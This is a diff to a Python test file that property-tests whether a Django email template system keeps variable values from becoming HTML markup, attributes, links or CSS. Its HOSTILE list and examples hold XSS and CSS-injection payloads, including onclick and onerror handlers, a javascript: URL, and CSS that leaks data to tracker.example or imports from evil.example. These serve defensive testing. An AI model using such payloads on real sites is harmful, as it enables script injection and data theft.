@@ -13,10 +13,10 @@ import time
 import zoneinfo
 from collections.abc import Callable, Iterable
 from decimal import Decimal
-from html.parser import HTMLParser
 from pathlib import Path
 from typing import Any
 
+import html5lib
 import pytest
 import yaml
 from asgiref.sync import sync_to_async
@@ -27,7 +27,7 @@ from django.template.base import DebugLexer, Node, Parser, tag_re
 from django.template.defaulttags import TemplateLiteral
 from django.utils import timezone
 from django.utils.safestring import SafeString, mark_safe
-from hypothesis import HealthCheck, example, given, settings
+from hypothesis import HealthCheck, event, example, given, settings
 from hypothesis import strategies as st
 from rebac import system_context
 
@@ -883,65 +883,45 @@ def test_values_never_become_markdown(plain: Any, kit: Any) -> None:
 # ---------- values ----------
 
 
-class _Reading(HTMLParser):
-    """What a mail client reads of a rendered body: elements, attributes, comments and CSS; text set aside.
+def _reading(html: str, *, scripting: bool) -> tuple[list[tuple[Any, ...]], list[str]]:
+    """What a browser reads of a rendered body, by html5lib's WHATWG tokeniser and tree construction.
 
-    Read twice, with scripting off and on, since a ``<noscript>`` element's content is markup to one reader and
-    text to the other.
+    The elements in document order with their attributes, and the comments; then the text of every ``style`` and
+    ``script`` element. ``scripting`` reads ``noscript`` as a browser with scripting on or off does. Independent of
+    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds.
     """
 
-    def __init__(self, *, scripting: bool) -> None:
-        super().__init__(convert_charrefs=True, scripting=scripting)
-        self.markup: list[tuple[Any, ...]] = []
-        self.css: list[str] = []
-
-    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
-        if tag != "br":  # linebreaksbr writes <br> after escaping, as it may
-            self.markup.append(("start", tag, tuple(attrs)))
-
-    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
-        self.handle_starttag(tag, attrs)
-
-    def handle_endtag(self, tag: str) -> None:
-        if tag != "br":
-            self.markup.append(("end", tag))
-
-    def handle_data(self, data: str) -> None:
-        if self.cdata_elem == "style":
-            self.css.append(data)
-
-    def handle_comment(self, data: str) -> None:
-        self.markup.append(("comment", data))
-
-    def handle_decl(self, decl: str) -> None:
-        self.markup.append(("decl", decl))
-
-    def unknown_decl(self, data: str) -> None:
-        self.markup.append(("decl", data))
-
-    def handle_pi(self, data: str) -> None:
-        self.markup.append(("pi", data))
+    root = html5lib.HTMLParser(namespaceHTMLElements=False).parse(html, scripting=scripting)
+    markup: list[tuple[Any, ...]] = []
+    raw: list[str] = []
+    for element in root.iter():
+        if not isinstance(element.tag, str):
+            markup.append(("comment", element.text))
+        elif element.tag != "br":  # linebreaksbr writes <br> after escaping, as it may
+            markup.append(("start", element.tag, tuple(element.attrib.items())))
+            if element.tag in ("style", "script"):
+                raw.append(element.text or "")
+    return markup, raw
 
 
 MARKER = "MARKER"
 
 
 def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) -> None:
-    """Property 1: ``value`` adds no element, attribute, comment or CSS, and reaches a link only through ``url``.
+    """Property 1: ``value`` adds no element, attribute or comment, no text in style or script, a link only by ``url``.
 
-    ``marker_html`` is the same rows rendered with :data:`MARKER` for the value. Every element and attribute is
-    the same in both, so is every ``<style>`` text, and an attribute value differs only where the HTML checks
-    admit an output (``title``, ``alt``…) or in ``href`` and ``src`` as ``url`` makes a link of the value.
+    ``marker_html`` is the same rows rendered with :data:`MARKER` for the value. A browser's reading of both has
+    the same elements, attribute names and comments, the same ``style`` and ``script`` text, and attribute values
+    that differ only where the HTML checks admit an output (``title``, ``alt``…) or in a link attribute as ``url``
+    makes a link of the value.
     """
 
     for scripting in (False, True):
-        marker, hostile = _Reading(scripting=scripting), _Reading(scripting=scripting)
-        for reading, html in ((marker, marker_html), (hostile, hostile_html)):
-            reading.feed(html)
-            reading.close()
-        assert hostile.css == marker.css, (hostile.css, marker.css)
-        assert [event[:2] for event in hostile.markup] == [event[:2] for event in marker.markup], hostile_html
-        for before, after in zip(marker.markup, hostile.markup, strict=True):
+        (marker, marker_raw), (hostile, hostile_raw) = (
+            _reading(marker_html, scripting=scripting), _reading(hostile_html, scripting=scripting))
+        assert hostile_raw == marker_raw, (hostile_raw, marker_raw)
+        assert [event[:2] for event in hostile] == [event[:2] for event in marker], hostile_html
+        for before, after in zip(marker, hostile, strict=True):
             if before[0] != "start":
                 assert after == before
                 continue
@@ -969,62 +949,130 @@ class _Rows:
 SPLICE = "y style=color:red onclick=alert(1)"
 JAVASCRIPT = "javascript:alert(document.domain)"
 CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
+HOSTILE = [
+    SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>', "</style><b onclick=x>", "' onclick=x '", "-->", "]]>", "x\x00y",
+    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)",
+]
 
 _ATTRIBUTE = st.builds(
-    lambda name, quoting, value: " " + name + quoting.format(value),
-    st.sampled_from(["title", "TITLE", "alt", "href", "style", "class"]),
-    st.sampled_from(['="{}"', "='{}'", "={}", ' = "{}"']),
+    lambda gap, name, quoting, value: gap + name + quoting.format(value),
+    st.sampled_from([" ", "\n", "\t", "\x0c", "\r", "\x0b", "\xa0", "/", "", "\x00"]),
+    st.sampled_from(["title", "TITLE", "alt", "href", "style", "class", "=x", 'x"', "lang", "dir", "src"]),
+    st.sampled_from(['="{}"', "='{}'", "={}", ' = "{}"', '="{}"\x0b', '\x0c="{}"', '="{}"/']),
     st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{{ v|upper }}", "{% if v %}{{ v }}{% endif %}",
-                     "color:{{ brand.light.text }}"]),
+                     "color:{{ brand.light.text }}", "a>b", "&amp;", "&quot;", ""]),
 )
 _START_TAG = st.builds(
     lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
-    st.sampled_from(["p", "span", "a", "td", "style", "title", "noscript", "xmp", "textarea"]),
-    st.lists(_ATTRIBUTE, max_size=3),
-    st.sampled_from([">", " >", " />", ""]),
+    st.sampled_from(["p", "span", "a", "td", "table", "tr", "select", "option", "style", "title", "img", "b", "div",
+                     "STYLE", "Title", "br", "noscript", "xmp", "textarea"]),
+    st.lists(_ATTRIBUTE, max_size=2),
+    st.sampled_from([">", "/>", " />", " / >", "//>", "\x0b>", "\r>", "\xa0>", ""]),
 )
+_PLAIN_TAG = st.builds(
+    lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
+    st.sampled_from(["p", "span", "a", "td", "table", "tr", "b", "div", "img", "br", "title", "style"]),
+    st.lists(st.builds(
+        lambda name, value: f' {name}="{value}"',
+        st.sampled_from(["title", "alt", "href", "style", "class", "lang", "src"]),
+        st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{% if v %}{{ v }}{% endif %}", "color:{{ brand.light.text }}",
+                         "&amp;", ""]),
+    ), max_size=2, unique_by=lambda attribute: attribute.split("=", 1)[0]),
+    st.sampled_from([">", " />"]),
+)
+"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter."""
+_PLAIN = st.sampled_from([
+    "</p>", "</span>", "</a>", "</b>", "</div>", "</td>", "</tr>", "</title>", "text", "{{ v }}", "&amp;", "AT&T",
+    "{% if v %}{{ v }}{% endif %}",
+])
 _HTML = st.lists(
-    st.one_of(_START_TAG, st.sampled_from([
-        "</p>", "</span>", "</a>", "</style>", "</title>", "</noscript>", "text", "{{ v }}", "{{ v|linebreaksbr }}",
-        '"', "'", ">", "<", "&", "\n",
+    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, st.sampled_from([
+        "</style>", "</style\x0b>", "</style/>", "</table>", "</select>", '"', "'", ">", "<", "&", "&lt", "\n",
+        "<!--x-->", "<!x>", "</ x>", "<?x>", "</>", "<![CDATA[x]]>", "<!doctype html>", '</p x="{{ v }}">', "<br/>",
+        "</title{{ v }}>", "<style/>", "<!--[if mso]><b>x</b><![endif]-->", "{% if v %}", "{% endif %}",
     ])),
-    max_size=8,
+    max_size=5,
 ).map("".join)
+_PART = st.one_of(st.just(""), _HTML)
+"""One row's part of a composition; often empty, so that most compositions differ from an admitted one in one place."""
 
 
 @settings(
-    deadline=None, max_examples=150,
-    suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow],
+    deadline=None, max_examples=3000,
+    suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow, HealthCheck.filter_too_much],
 )
-@given(
-    before=_HTML, block=_HTML, after=_HTML,
-    value=st.one_of(st.sampled_from([SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>']), st.text(max_size=40)),
-)
-# The reviewers' rows: a repeated attribute name (S1), and a row that ends inside a tag or a <style> (S2).
-@example(before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
-@example(before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
-@example(before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="", after="", value=SPLICE)
-@example(before="", block="<p>Hi</p><a", after=' href="{{ v }}" style="background:url({{ v }})">Open</a>',
+@given(head=_PART, tail=_PART, before=_PART, block=_PART, after=_PART, value=st.one_of(
+    st.sampled_from(HOSTILE), st.text(max_size=40)))
+# Rows found to break the property: a repeated attribute name and a noscript splice (S1); a row ending inside a tag
+# or a <style> (S2); a self-closing <style/>, in a block and in a layout (rule 4); template code glued to </title
+# (rule 6); a literal NUL forging a placeholder (rule 1).
+@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(head="", tail="", before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="",
+         after="", value=SPLICE)
+@example(head="", tail="", before="", block="<p>Hi</p><a",
+         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT)
+@example(head="", tail="", before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>',
          value=JAVASCRIPT)
-@example(before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>', value=JAVASCRIPT)
-@example(before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
-def test_a_value_never_becomes_markup(kit: Any, before: str, block: str, after: str, value: str) -> None:
-    """Property 1, over the rows the walk admits: a value never becomes markup, an attribute, a link target or CSS.
+@example(head="", tail="", before="", block="<p>Hi</p><style>", after="Hello {{ v }}, welcome.", value=CSS)
+@example(head="", tail="", before="", block="<p>Hi</p><style/>", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
+@example(head="<p>Hi</p><style/>", tail="", before="", block="", after="<p>Hello {{ v }}, welcome.</p>", value=CSS)
+@example(head="", tail="", before='<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
+         block="", after="<p>Body</p>", value="/ onerror=alert(1)")
+@example(head="", tail="", before='<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
+         block="", after="", value=";background-image:url(https://tracker.example/leak)")
+def test_a_value_never_becomes_markup(
+    kit: Any, head: str, tail: str, before: str, block: str, after: str, value: str,
+) -> None:
+    """Property 1, over the rows the walk admits, read as a browser reads them (html5lib).
 
-    The rows are drawn from tags in every quoting and spelling of their attributes, raw-text elements, and a
-    block that may end anywhere, included between two runs of the template's own HTML.
+    The rows meet as a layout around a template and a template around an included block, each drawn from tags in
+    every quoting, spelling and whitespace of their attributes, self-closing and raw-text elements, comments,
+    declarations, entities and template code, ending anywhere.
     """
 
     template = _unsaved(
         format="html", source=before + '{% include "blocks/probe" with v=v only %}' + after, text_source="{{ v }}",
-        variables={"v": "x"},
+        variables={"v": "x"}, layout="probe",
     )
-    rows = _Rows(template, _unsaved("layout", "plain"),
-                 _unsaved("block", "probe", source=block, text_source="x", variables={"v": "x"}))
+    rows = _Rows(
+        template, _unsaved("block", "probe", source=block, text_source="x", variables={"v": "x"}),
+        _unsaved("layout", "probe", source=head + "{% block content %}{% endblock %}" + tail, text_source=PLAIN_TEXT,
+                 variables={"v": "x"}),
+    )
     try:
         walk = TemplateWalker(saving=True).walk(template, rows)
     except ValidationError:
+        event("refused")
         return  # a refused row never renders
+    event("admitted")
+    marker = walk.render({"v": MARKER}, kit=kit).html
+    _assert_value_stays_text(marker, walk.render({"v": value}, kit=kit).html, value)
+
+
+_MARKDOWN = st.lists(st.sampled_from([
+    "{{ v }}", "[a]({{ v }})", "![a]({{ v }})", "[{{ v }}](https://example.test/)", "<{{ v }}>", "[a](<{{ v }}>)",
+    "`x`", "**b**", "<b>raw</b>", "<!-- c -->", "<style>", "<style/>", "\n\n", "\n", "- ", "> ", "# ", "    ",
+    '{% include "blocks/probe" with v=v only %}', "{% if v %}", "{% endif %}", "[r]: https://example.test/",
+    "&amp;", "&", "<", ">", '"', "https://example.test/{{ v }}", "\\\\",
+]), min_size=1, max_size=7).map("".join)
+
+
+@settings(deadline=None, max_examples=150, suppress_health_check=[HealthCheck.function_scoped_fixture])
+@given(source=_MARKDOWN, head=_HTML, value=st.one_of(st.sampled_from(HOSTILE), st.text(max_size=40)))
+@example(source="Hello **{{ v }}**.", head="<style/>", value=CSS)
+def test_a_value_never_becomes_markup_through_markdown(kit: Any, source: str, head: str, value: str) -> None:
+    """Property 1 for Markdown templates, in a layout whose head is drawn too, read as a browser reads them."""
+
+    template = _unsaved(source=source, variables={"v": "x"}, layout="probe")
+    rows = _Rows(
+        template, _unsaved("block", "probe", source="<b>{{ v }}</b>", text_source="x", variables={"v": "x"}),
+        _unsaved("layout", "probe", source=head + "{% block content %}{% endblock %}", text_source=PLAIN_TEXT),
+    )
+    try:
+        walk = TemplateWalker(saving=True).walk(template, rows)
+    except ValidationError:
+        return
     marker = walk.render({"v": MARKER}, kit=kit).html
     _assert_value_stays_text(marker, walk.render({"v": value}, kit=kit).html, value)
 
